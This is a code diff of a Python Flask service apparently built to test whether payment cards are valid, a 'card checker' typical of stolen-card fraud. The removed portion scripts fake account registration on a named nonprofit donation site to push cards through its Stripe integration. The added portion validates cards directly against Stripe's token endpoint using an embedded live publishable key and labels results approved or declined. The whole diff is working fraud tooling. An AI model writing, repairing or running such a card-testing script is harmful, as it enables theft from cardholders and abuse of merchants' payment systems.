@@ -1,44 +1,20 @@
 from flask import Flask, request, jsonify
 import requests
 import re
-import random
-import string
 
 app = Flask(__name__)
 
 def full_stripe_check(cc, mm, yy, cvv):
     session = requests.Session()
     session.headers.update({
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     })
 
     if len(yy) == 4:
         yy = yy[-2:]
 
     try:
-        # Step 1 & 2: Get login nonce
-        login_page_res = session.get('https://www.bsdcorp.org/donate/')
-        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
-        if not login_nonce_match:
-            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
-        login_nonce = login_nonce_match.group(1)
-
-        # Step 3: Register a new account for a valid session
-        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
-        register_data = {
-            'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
-            '_wp_http_referer': '/donate/', 'register': 'Register',
-        }
-        session.post('https://www.bsdcorp.org/donate/', data=register_data)
-
-        # Step 4: Get payment nonce with the valid session
-        payment_page_res = session.get('https://www.bsdcorp.org/donate/add-payment-method/')
-        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
-        if not payment_nonce_match:
-            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
-        ajax_nonce = payment_nonce_match.group(1)
-
-        # Step 5: Get Stripe payment token using v1/tokens
+        # Direct Stripe v1/tokens - No website dependency
         stripe_data = {
             'card[number]': cc,
             'card[exp_month]': mm,
@@ -46,35 +22,36 @@ def full_stripe_check(cc, mm, yy, cvv):
             'card[cvc]': cvv,
             'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
         }
-        stripe_response = session.post('https://api.stripe.com/v1/tokens', data=stripe_data)
-        if stripe_response.status_code == 402:
-            error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
-            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
-        payment_token = stripe_response.json().get('id')
-        if not payment_token:
-            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
-
-        # Step 6: Submit to website
-        site_data = {
-            'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
-            'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
-        }
-        final_response = session.post('https://www.bsdcorp.org/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
-        response_json = final_response.json()
-
-        if "Unable to verify your request" in response_json.get('messages', ''):
-             return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
-        if response_json.get('success') is False or response_json.get('status') == 'error':
-            error_message = (response_json.get('data', {}).get('error', {}).get('message') or
-                             re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
-            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
-        if response_json.get('status') == 'succeeded':
-            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
+        
+        stripe_response = session.post('https://api.stripe.com/v1/tokens', data=stripe_data, timeout=15)
+        
+        # Success - Card accepted
+        if stripe_response.status_code == 200:
+            return {"status": "Approved", "response": "Card accepted", "decline_type": "none"}
+        
+        # Card declined
+        elif stripe_response.status_code == 402:
+            error = stripe_response.json().get('error', {})
+            return {
+                "status": "Declined",
+                "response": error.get('message', 'Card declined'),
+                "decline_type": error.get('code', 'card_decline')
+            }
+        
+        # Invalid card format
+        elif stripe_response.status_code == 400:
+            error = stripe_response.json().get('error', {})
+            return {
+                "status": "Declined",
+                "response": error.get('message', 'Invalid card'),
+                "decline_type": error.get('code', 'invalid_card')
+            }
+        
         else:
-            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
-
+            return {"status": "Declined", "response": "Error from payment processor", "decline_type": "process_error"}
+    
     except Exception as e:
-        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}
+        return {"status": "Declined", "response": str(e), "decline_type": "process_error"}
 
 def get_bin_info(bin_number):
     try:
